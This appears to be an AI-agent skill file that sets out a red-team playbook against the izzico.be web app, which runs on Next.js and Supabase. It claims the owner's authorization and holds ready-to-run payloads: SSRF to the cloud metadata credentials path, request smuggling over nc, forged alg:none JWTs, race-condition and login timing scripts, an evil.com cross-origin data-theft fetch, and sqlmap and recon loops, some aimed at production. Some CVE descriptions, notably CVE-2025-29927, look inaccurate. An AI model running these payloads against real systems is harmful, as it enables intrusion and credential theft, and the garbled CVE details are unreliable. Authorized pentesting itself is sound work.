---
description: "Advanced Red Team penetration testing with cutting-edge exploitation techniques (2025-2026). Uses real-world CVEs and bug bounty methods. AUTHORIZED DEFENSIVE TESTING ONLY."
skillType: security-offensive-advanced
authorization: "Samuel Baudon - Authorized ethical hacking for Izzico"
environment: staging-only
priority: critical
---

# ⚡ ADVANCED RED TEAM TESTING - Expert Level

**Authorization** : Samuel Baudon (Propriétaire izzico.be)
**Skill Level** : EXPERT (Top 1% bug bounty techniques)
**Sources** : HackerOne, GitHub Security, Recent CVEs 2025-2026
**Updated** : Janvier 2026 (includes latest exploitation techniques)

---

## 🔥 RECENT CRITICAL CVES (2025-2026)

### CVE-2025-55182: React2Shell (CVSS 10.0)

**Description** : Unauthenticated RCE in React Server Components
**Affected** : React 19 + Next.js App Router
**Disclosure** : December 3, 2025
**Exploitation** : Active in the wild (APT groups, CL-STA-1015)

**Attack Vector** :
```typescript
// Malicious HTTP request to Next.js App Router
POST /_next/data/[buildId]/route.json
Content-Type: text/x-component

// Crafted React Flight protocol payload
// Exploits insecure deserialization
// → Remote Code Execution on server

// Payload: Serialized React element with malicious server action
```

**Test for Izzico** :
```
✅ Check Next.js version: 14.2.18
✅ Check if vulnerable: Next.js <15.1.7 potentially affected
✅ Verify App Router usage: YES (app/ directory)
✅ Test exploit: Send crafted Flight protocol request
```

**Expected Result** :
- If vulnerable: Server executes attacker code
- If patched: Request rejected or safely handled

**Sources** :
- [Wiz Research: React2Shell Critical Vulnerability](https://www.wiz.io/blog/critical-vulnerability-in-react-cve-2025-55182)
- [Unit42: Exploitation of React Server Components](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- [Microsoft Security: Defending Against React2Shell](https://www.microsoft.com/en-us/security/blog/2025/12/15/defending-against-the-cve-2025-55182-react2shell-vulnerability-in-react-server-components/)

---

### CVE-2025-29927: Next.js Middleware Bypass

**Description** : Authentication bypass via middleware misconfiguration
**Affected** : Next.js middleware implementations

**Attack Vector** :
```typescript
// Craft request with manipulated pathname
GET /admin HTTP/1.1
Host: izzico.be
X-Forwarded-Host: evil.com
X-Forwarded-Proto: http

// If middleware checks request.nextUrl.pathname naively,
// attacker can bypass path-based auth checks
```

**Test for Izzico** :
```typescript
// Check middleware.ts for vulnerable patterns:
const { pathname } = request.nextUrl; // ✅ Safe usage found

// Test: Try header manipulation
curl -H "X-Forwarded-Host: evil.com" https://staging.izzico.be/admin
```

**Expected Result** : Vercel/Cloudflare sanitizes headers, bypass impossible ✅

**Source** : [Pentest-Tools: Next.js CVE-2025-29927 Bypass](https://pentest-tools.com/blog/cve-2025-29927-next-js-bypass)

---

### CVE-2024-34351: SSRF in Server Actions

**Description** : Server-Side Request Forgery via Server Actions
**Affected** : Next.js <14.1.1

**Attack Vector** :
```typescript
// Next.js Server Action that redirects
'use server'
export async function myAction() {
  redirect('/relative-path'); // Vulnerable if Host header manipulated
}

// Attacker modifies Host header:
POST /_next/data/action HTTP/1.1
Host: evil.com

// Server Action redirects to: https://evil.com/relative-path
// → SSRF to internal network
```

**Test for Izzico** :
```bash
# Check for Server Actions with redirects
grep -r "redirect\|permanentRedirect" app/ --include="*.ts"

# Test Host header manipulation
curl -H "Host: evil.com" https://staging.izzico.be/api/action
```

**Expected Result** : Next.js 14.2.18 is patched ✅

**Source** : [Assetnote: SSRF in Next.js Apps](https://www.assetnote.io/resources/research/digging-for-ssrf-in-nextjs-apps)

---

### SSRF via /_next/image

**Description** : Blind SSRF via Next.js Image Optimization
**Affected** : All Next.js versions with Image component

**Attack Vector** :
```bash
# Force Next.js to make requests to attacker-controlled server
https://izzico.be/_next/image?url=https://internal-server:6379&w=256&q=75

# Or chain with open redirect:
https://izzico.be/_next/image?url=https://trusted.com/redirect?to=http://169.254.169.254/latest/meta-data/&w=256

# → SSRF to AWS metadata endpoint (if hosted on AWS/EC2)
```

**Test for Izzico** :
```bash
# Test 1: Internal network access
curl "https://staging.izzico.be/_next/image?url=http://localhost:5432&w=256&q=75"

# Test 2: AWS metadata (if on AWS)
curl "https://staging.izzico.be/_next/image?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/&w=256&q=75"

# Expected:
# - Vercel hosting (not AWS EC2) = no metadata endpoint
# - Image domain whitelist blocks external URLs
```

**Source** : [Intigriti: SSRF in Next.js Targets](https://www.intigriti.com/researchers/blog/hacking-tools/ssrf-vulnerabilities-in-nextjs-targets)

---

## 🎯 ADVANCED ATTACK TECHNIQUES

### 1. RLS Bypass via SECURITY DEFINER

**Technique** : Exploit functions that run with elevated privileges

**Attack Vector** :
```sql
-- Find SECURITY DEFINER functions created by postgres role
SELECT proname, proowner::regrole
FROM pg_proc
WHERE prosecdefiner = true
  AND proowner::regrole::text = 'postgres';

-- These functions BYPASS RLS automatically
-- Look for exploitable logic flaws
```

**Test for Izzico** :
```sql
-- Check all SECURITY DEFINER functions
SELECT
  proname as function_name,
  pg_get_functiondef(oid) as definition
FROM pg_proc
WHERE prosecdefiner = true
ORDER BY proname;

-- Review each for:
-- 1. Missing auth.uid() checks
-- 2. SQL injection in dynamic queries
-- 3. Logic flaws (always TRUE conditions)
```

**Source** : [Supabase GitHub Discussion: RLS Bypass](https://github.com/orgs/supabase/discussions/3563)

---

### 2. View-Based RLS Bypass

**Technique** : Views run as SECURITY DEFINER by default

**Attack** :
```sql
-- If a view was created by superuser:
CREATE VIEW user_data_view AS SELECT * FROM users;

-- This view BYPASSES RLS policies!
-- Any user can: SELECT * FROM user_data_view;
```

**Test for Izzico** :
```sql
-- Find all views
SELECT viewname, viewowner
FROM pg_views
WHERE schemaname = 'public';

-- Test if accessible without auth:
-- (as anonymous user)
SELECT * FROM [view_name];
```

**Expected** : No dangerous views found (need to verify)

**Source** : [Bytebase: Postgres RLS Footguns](https://www.bytebase.com/blog/postgres-row-level-security-footguns/)

---

### 3. Supabase Service Role Key Exposure

**Technique** : Find leaked service_role key (bypasses ALL RLS)

**Search Vectors** :
```bash
# GitHub code search
site:github.com "SUPABASE_SERVICE_ROLE_KEY" OR "service_role" "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"

# Exposed .env files
https://izzico.be/.env
https://izzico.be/.env.local
https://izzico.be/api/.env

# Source maps (if enabled)
https://izzico.be/_next/static/chunks/*.js.map
```

**Test for Izzico** :
```bash
# Verify .env not accessible
curl https://staging.izzico.be/.env # Should 404

# Verify source maps not in production
curl https://izzico.be/_next/static/chunks/main.js.map # Should 404

# Verify no secrets in client bundle
curl https://izzico.be/_next/static/chunks/pages/_app.js | grep -i "service_role\|secret\|password"
```

**Expected** : No secrets exposed ✅

---

### 4. PostgreSQL Column-Level Security Bypass

**Technique** : RLS filters rows, NOT columns

**Attack** :
```sql
-- Even with RLS, sensitive columns visible in allowed rows
SELECT * FROM user_profiles WHERE user_id = auth.uid();
-- Returns: id, email, phone, SSN, bank_info (if in same table)

-- RLS says "you can see your row"
-- But ALL columns in that row are visible!
```

**Mitigation Check** :
```sql
-- Verify sensitive columns in separate tables with own RLS
-- user_bank_info (separate table) ✅
-- passwords (not stored, Supabase Auth) ✅
```

**Source** : [Supabase Docs: Column Level Security](https://supabase.com/docs/guides/database/postgres/column-level-security)

---

### 5. Prototype Pollution → RCE Chain

**Technique** : Pollute Object.prototype in Node.js

**Attack** :
```json
POST /api/endpoint
{
  "__proto__": {
    "isAdmin": true,
    "role": "admin"
  }
}

// Or via query string:
GET /api/endpoint?__proto__[isAdmin]=true
```

**Exploitation Chain** :
```
1. Pollute prototype with isAdmin=true
2. Code checks: if (user.isAdmin) { /* grant access */ }
3. Prototype pollution makes ALL objects have isAdmin=true
4. → Privilege escalation
```

**Test for Izzico** :
```typescript
// Search for vulnerable patterns:
grep -r "Object.assign\|Object.merge" app/ lib/

// Test endpoint:
POST /api/user/profile
{
  "__proto__": { "role": "admin" },
  "name": "Test"
}

// Then check if admin access granted
```

**Expected** : Zod validation strips __proto__ keys ✅

---

### 6. JWT Algorithm Confusion Attack

**Technique** : Change algorithm from RS256 to HS256

**Attack** :
```javascript
// Original JWT (RS256 - asymmetric)
header: { "alg": "RS256", "typ": "JWT" }

// Attacker modifies to HS256 (symmetric)
header: { "alg": "HS256", "typ": "JWT" }

// Signs with PUBLIC key (known to attacker)
// If server verifies with same public key as secret → accepts!
```

**Test for Izzico** :
```typescript
// Supabase uses HMAC-SHA256 (symmetric) by default
// Check if algorithm is enforced:

const jwt = 'eyJhbGci...';
const modified = modifyAlgorithm(jwt, 'none'); // Algorithm: none

// Try to use modified JWT
curl -H "Authorization: Bearer $modified" /api/endpoint
```

**Expected** : Supabase rejects (algorithm validation) ✅

---

### 7. Race Condition Exploitation

**Technique** : Exploit timing windows in DB transactions

**Attack** :
```javascript
// 24h cooldown on bank info changes
// Attack: Send 100 requests simultaneously BEFORE first commits

const promises = [];
for (let i = 0; i < 100; i++) {
  promises.push(
    fetch('/api/user/bank-info', {
      method: 'POST',
      body: JSON.stringify({ iban: `IBAN${i}` })
    })
  );
}

await Promise.all(promises);

// If no DB-level locking:
// - First request starts transaction
// - Checks: last_modified = NULL (OK)
// - 99 other requests check simultaneously → ALL see NULL
// - All 100 requests commit → cooldown bypassed
```

**Test for Izzico** :
```sql
-- Check for DB-level constraints:
SELECT constraint_name, constraint_type
FROM information_schema.table_constraints
WHERE table_name = 'user_bank_info';

-- Check for row-level locks in update_bank_info_secure:
-- Does it use SELECT FOR UPDATE? (pessimistic locking)
```

**Potential Finding** : ⚠️ No explicit row locking found (needs verification)

---

### 8. Mass Assignment Vulnerability

**Technique** : Send extra fields in JSON, escalate privileges

**Attack** :
```json
POST /api/user/profile
{
  "name": "John",
  "bio": "Developer",
  "role": "admin",              // Extra field (not in form)
  "is_verified": true,          // Extra field
  "subscription_expires": "2099-12-31"  // Extra field
}

// If backend does:
// const data = await request.json();
// await supabase.from('users').update(data); // ❌ Updates ALL fields!
```

**Test for Izzico** :
```bash
# Test on all POST/PUT endpoints
curl -X POST /api/user/profile \
  -d '{"name":"Test","role":"admin","is_super_admin":true}'

# Check if extra fields accepted
```

**Expected** : Zod schemas whitelist exact fields ✅

---

### 9. NoSQL Injection (Supabase PostgREST)

**Technique** : Exploit PostgREST query operators

**Attack** :
```bash
# PostgREST supports operators: eq, neq, gt, lt, like, ilike, in
# Can they be abused?

GET /rest/v1/users?id=eq.1&email=like.*@admin.com

# Or via JSON:
GET /rest/v1/users?or=(id.eq.1,role.eq.admin)

# Complex query injection:
GET /rest/v1/users?select=*&limit=1000000
```

**Test for Izzico** :
```bash
# Try to bypass filters
curl "https://supabase-url/rest/v1/user_profiles?select=*&user_id=neq.own-id"

# Expected: RLS still enforces USING (user_id = auth.uid())
# Even with query operators, can't see other users ✅
```

**Expected** : RLS enforced regardless of query operators ✅

---

### 10. HTTP Request Smuggling

**Technique** : Desync frontend/backend via ambiguous requests

**Attack** :
```http
POST /api/endpoint HTTP/1.1
Host: izzico.be
Content-Length: 44
Transfer-Encoding: chunked

0

POST /api/admin/secret HTTP/1.1
Host: izzico.be
Content-Length: 10

malicious
```

**Test** :
```bash
# Send ambiguous Content-Length + Transfer-Encoding
echo -ne "POST /api/test HTTP/1.1\r\nHost: staging.izzico.be\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG" | nc staging.izzico.be 443
```

**Expected** : Vercel normalizes requests, smuggling impossible ✅

---

### 11. WebSocket Hijacking (Supabase Realtime)

**Technique** : Hijack WebSocket connections for unauthorized subscriptions

**Attack** :
```javascript
// Supabase Realtime uses WebSockets
// wss://[project].supabase.co/realtime/v1/websocket

// Attacker connects with stolen token
const ws = new WebSocket('wss://fgthoyilfupywmpmiuwd.supabase.co/realtime/v1');

ws.send(JSON.stringify({
  type: 'access_token',
  payload: { access_token: 'stolen-jwt' }
}));

// Subscribe to tables
ws.send(JSON.stringify({
  type: 'subscribe',
  payload: { channel: 'public:user_bank_info' }
}));

// Listen for real-time updates to ALL bank info
```

**Test for Izzico** :
```sql
-- Check RLS on Realtime subscriptions
-- Are realtime policies defined?

SELECT tablename, policyname, cmd
FROM pg_policies
WHERE tablename IN (
  SELECT tablename FROM pg_publication_tables
  WHERE pubname = 'supabase_realtime'
);
```

**Expected** : RLS blocks unauthorized subscriptions ✅

---

### 12. GraphQL-Style Over-Fetching (PostgREST)

**Technique** : Abuse PostgREST nested resource loading

**Attack** :
```bash
# Request with deep nesting
GET /rest/v1/users?select=id,name,posts(*,comments(*,author(*)))

# Causes N+1 queries, potential DoS
# Or exposes data via joins that bypass intent
```

**Test for Izzico** :
```bash
# Verify PostgREST is not directly exposed
curl https://staging.izzico.be/rest/v1/users

# Expected: 404 (PostgREST not publicly accessible) ✅
# All DB access via Supabase client (controlled)
```

---

### 13. Timing Attack on Password Verification

**Technique** : Measure response time to guess password correctness

**Attack** :
```python
import time

def timing_attack(email):
    times = []
    for password in ['wrong1', 'wrong2', 'maybe_right']:
        start = time.time()
        response = requests.post('/api/auth/login', json={
            'email': email,
            'password': password
        })
        elapsed = time.time() - start
        times.append((password, elapsed))

    # If correct password takes longer (bcrypt comparison):
    # → Can identify correct password by timing
    return max(times, key=lambda x: x[1])
```

**Test for Izzico** :
```python
# Measure response times
# If variance >100ms between correct/incorrect → vulnerable
```

**Mitigation** :
```typescript
// Constant-time comparison or rate limiting makes timing attack impractical
```

**Expected** : Rate limiting makes attack impractical ✅

---

### 14. Second-Order SQL Injection

**Technique** : Store malicious payload, trigger later

**Attack** :
```
Step 1: Store payload in database
POST /api/user/profile
{
  "name": "Robert'; DROP TABLE users;--"
}

// Stored safely (parameterized query)

Step 2: Trigger via different endpoint that uses unsafe query
GET /api/admin/search?name=<from_database>

// If admin search does:
// query = `SELECT * FROM users WHERE name = '${stored_name}'`
// → SQL injection triggered!
```

**Test for Izzico** :
```bash
# 1. Store special chars in all text fields
# 2. Access admin endpoints that display this data
# 3. Check if any unsafe string concatenation occurs
```

**Expected** : All queries use Supabase client (safe) ✅

---

### 15. CORS Misconfiguration with Credentials

**Technique** : Exploit overly permissive CORS with credentials

**Attack** :
```javascript
// From evil.com:
fetch('https://izzico.be/api/user/profile', {
  method: 'GET',
  credentials: 'include', // Send cookies cross-origin
  headers: { 'Content-Type': 'application/json' }
});

// If server responds with:
// Access-Control-Allow-Origin: *
// Access-Control-Allow-Credentials: true
// → Attacker can steal data with user's cookies
```

**Test for Izzico** :
```bash
# Send cross-origin request with credentials
curl -H "Origin: https://evil.com" \
     -H "Cookie: sb-session=..." \
     https://staging.izzico.be/api/user/profile

# Check response for:
# Access-Control-Allow-Origin: *  ← Vulnerable
# Access-Control-Allow-Credentials: true  ← Vulnerable
```

**Expected** : No CORS headers or specific origins only ✅

---

### 16. JWT None Algorithm Attack

**Technique** : Remove signature verification

**Attack** :
```javascript
// Modify JWT header
const header = {
  "alg": "none", // No signature required
  "typ": "JWT"
};

const payload = {
  "sub": "user-id",
  "role": "admin", // Escalate
  "exp": 9999999999
};

// JWT = base64(header) + '.' + base64(payload) + '.'
// No signature!

// If server accepts "none" algorithm → bypass!
```

**Test** :
```bash
# Create JWT with alg:none
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64)
PAYLOAD=$(echo -n '{"sub":"test","role":"admin"}' | base64)
JWT="$HEADER.$PAYLOAD."

curl -H "Authorization: Bearer $JWT" /api/admin/endpoint
```

**Expected** : Supabase rejects (algorithm whitelist) ✅

---

### 17. Cache Poisoning via Next.js

**Technique** : Poison Next.js cache with malicious content

**Attack** :
```bash
# If Next.js caching enabled:
GET /api/endpoint HTTP/1.1
Host: izzico.be
X-Forwarded-Host: evil.com

# Response cached with evil.com in links
# Future users get poisoned cached response
```

**Test** :
```typescript
// Check next.config.mjs for caching:
grep -A5 "Cache-Control" next.config.mjs

// Check API routes for cache headers:
grep -r "Cache-Control" app/api/
```

**Expected** : No aggressive caching on dynamic content ✅

---

### 18. Subdomain Takeover

**Technique** : Take over abandoned DNS records

**Test** :
```bash
# Check DNS records
dig izzico.be ANY
dig www.izzico.be
dig staging.izzico.be
dig api.izzico.be

# Look for dangling CNAMEs:
# staging.izzico.be CNAME old-vercel-deployment.vercel.app

# If old-vercel-deployment not claimed → attacker can claim it
```

**Expected** : All subdomains active or removed ✅

---

### 19. Supply Chain Attack via Dependencies

**Technique** : Exploit vulnerable NPM packages

**Already Tested** : 8 CVEs found and patched ✅

**Advanced Test** :
```bash
# Check for typosquatting in package.json
cat package.json | grep -E "react|next|supabase"

# Verify official packages:
# ✅ next (not nextjs, next-js)
# ✅ react (not reactjs)
# ✅ @supabase/supabase-js (not supabase-client)
```

---

### 20. Server-Side Template Injection (SSTI)

**Technique** : Inject template syntax for code execution

**Payloads** :
```
{{7*7}}                 # Template engines
${7*7}                  # ES6 template literals
<%= 7*7 %>              # EJS
{{ config.items[0] }}   # Jinja2/Twig
```

**Test** :
```bash
# Test on all text inputs
POST /api/user/profile
{
  "bio": "{{7*7}}"
}

# Check if rendered as "49" (vulnerable) or "{{7*7}}" (safe)
```

**Expected** : No template engines used, React renders as-is ✅

---

## 🎯 ADVANCED TESTING WORKFLOW

### Step 1: Automated Recon

```bash
#!/bin/bash
# Full reconnaissance automation

# Subdomain enumeration
subfinder -d izzico.be | tee subdomains.txt

# Port scanning
nmap -sV -T4 -p- staging.izzico.be

# Technology detection
whatweb staging.izzico.be

# Endpoint discovery
gospider -s https://staging.izzico.be -d 3 -c 10 | tee endpoints.txt

# Parameter mining
arjun -u https://staging.izzico.be/api/endpoint

# JS file analysis
cat endpoints.txt | grep "\.js$" | xargs -I {} curl {} | grep -oE "(api|endpoint|/[a-zA-Z0-9/_-]+)"
```

### Step 2: Automated Vulnerability Scanning

```bash
# OWASP ZAP full scan
docker run -v $(pwd):/zap/wrk/:rw -t zaproxy/zap-stable zap-full-scan.py \
  -t https://staging.izzico.be \
  -r pentest_report.html

# Nuclei with all templates
nuclei -u https://staging.izzico.be \
  -t ~/nuclei-templates/ \
  -severity critical,high,medium \
  -o nuclei_results.txt

# SQLMap on all endpoints with parameters
cat endpoints.txt | grep "?" | while read url; do
  sqlmap -u "$url" --batch --random-agent
done
```

### Step 3: Manual Expert Testing

```
1. Review all SECURITY DEFINER functions for logic flaws
2. Test every RLS policy with edge cases
3. Attempt privilege escalation via parameter pollution
4. Test timing attacks on auth endpoints
5. Verify no SSRF in Image Optimization
6. Check for prototype pollution
7. Test CVE-2025-55182 (React2Shell) exploit
8. Attempt JWT manipulation (algorithm confusion)
9. Race condition testing on financial endpoints
10. Business logic fuzzing
```

---

## 📚 ADVANCED TOOLS ARSENAL

### Reconnaissance
- subfinder (subdomain enumeration)
- amass (DNS enumeration)
- nmap (port scanning)
- masscan (fast port scanner)

### Vulnerability Scanning
- nuclei (template-based scanning)
- OWASP ZAP (automated pentesting)
- Burp Suite Pro (manual testing)
- Acunetix (commercial scanner)

### Exploitation
- sqlmap (SQL injection)
- XSStrike (XSS detection)
- Commix (command injection)
- NoSQLMap (NoSQL injection)

### Post-Exploitation
- Metasploit (exploitation framework)
- Empire (post-exploitation)
- BloodHound (privilege escalation mapping)

---

## 🎯 BUG BOUNTY METHODOLOGY

### Phase 1: Information Gathering (4h)

```
1. Passive Recon:
   - Google dorking (site:izzico.be inurl:admin)
   - GitHub code search (org:izzico secrets)
   - Wayback Machine (old endpoints)
   - Certificate Transparency logs (subdomains)

2. Active Recon:
   - Subdomain brute-force
   - Port scanning (all 65535 ports)
   - Service fingerprinting
   - Technology stack mapping

3. Endpoint Discovery:
   - Spider/crawl entire site
   - JavaScript file analysis
   - API endpoint extraction
   - Hidden parameter discovery
```

### Phase 2: Vulnerability Assessment (8h)

```
1. OWASP Top 10 (automated):
   - Injection (SQL, NoSQL, Command, LDAP)
   - Broken Authentication
   - Sensitive Data Exposure
   - XXE, SSRF, Deserialization
   - Security Misconfiguration
   - XSS, CSRF
   - Insecure Deserialization
   - Using Components with Known Vulnerabilities
   - Insufficient Logging & Monitoring

2. Business Logic Flaws (manual):
   - Race conditions
   - Price manipulation
   - Workflow bypass
   - Privilege escalation
   - IDOR (Insecure Direct Object Reference)
```

### Phase 3: Exploitation (6h)

```
1. Develop PoC exploits
2. Chain vulnerabilities (low + low = critical)
3. Test impact (data access, code execution, etc.)
4. Document exploitation steps
```

### Phase 4: Reporting (2h)

```
1. Write professional report
2. CVSS scoring
3. Remediation recommendations
4. Executive summary
```

**Total Time** : 20 hours (professional pentest equivalent)

---

## 📊 CHECKLIST ADVANCED ATTACKS

```
□ CVE-2025-55182 (React2Shell) - RCE test
□ SSRF via /_next/image
□ SSRF via Server Actions
□ SSRF via Middleware
□ RLS bypass via SECURITY DEFINER
□ RLS bypass via Views
□ Service role key exposure
□ Prototype pollution
□ Mass assignment
□ JWT algorithm confusion
□ JWT none algorithm
□ Race conditions (bank info, payments)
□ Second-order SQL injection
□ NoSQL injection (PostgREST)
□ HTTP request smuggling
□ WebSocket hijacking
□ Cache poisoning
□ Subdomain takeover
□ Timing attacks
□ CSTI/SSTI
□ XML External Entity (XXE)
□ Insecure deserialization
□ OAuth token theft
□ PKCE bypass attempts
□ Open redirect chaining
□ CORS with credentials abuse
```

---

## 🚀 EXECUTION

When activated, this skill will:

1. **TEST** (not exploit) all 25 advanced attack vectors
2. **DOCUMENT** every finding (even if exploit not executed)
3. **PROPOSE** fixes for ALL vulnerabilities
4. **GENERATE** professional pentest report

**Estimated Time** : 20 hours comprehensive testing
**Value** : Equivalent to €5,000-10,000 professional pentest

---

**Sources** :
- [DeepStrike: Next.js Security Testing for Bug Hunters](https://deepstrike.io/blog/nextjs-security-testing-bug-bounty-guide)
- [DeepStrike: Hacking Misconfigured Supabase Instances](https://deepstrike.io/blog/hacking-thousands-of-misconfigured-supabase-instances-at-scale)
- [Wiz: React2Shell Critical Vulnerability](https://www.wiz.io/blog/critical-vulnerability-in-react-cve-2025-55182)
- [Intigriti: SSRF in Next.js Targets](https://www.intigriti.com/researchers/blog/hacking-tools/ssrf-vulnerabilities-in-nextjs-targets)
- [Unit42: React Server Components Exploitation](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- [Assetnote: SSRF in Next.js Apps](https://www.assetnote.io/resources/research/digging-for-ssrf-in-nextjs-apps)
- [Bytebase: Postgres RLS Footguns](https://www.bytebase.com/blog/postgres-row-level-security-footguns/)
- [Bug Bounty Hunting Guide 2026](https://dev.to/krlz/bug-bounty-hunting-guide-2026-from-zero-to-paid-security-researcher-5c82)
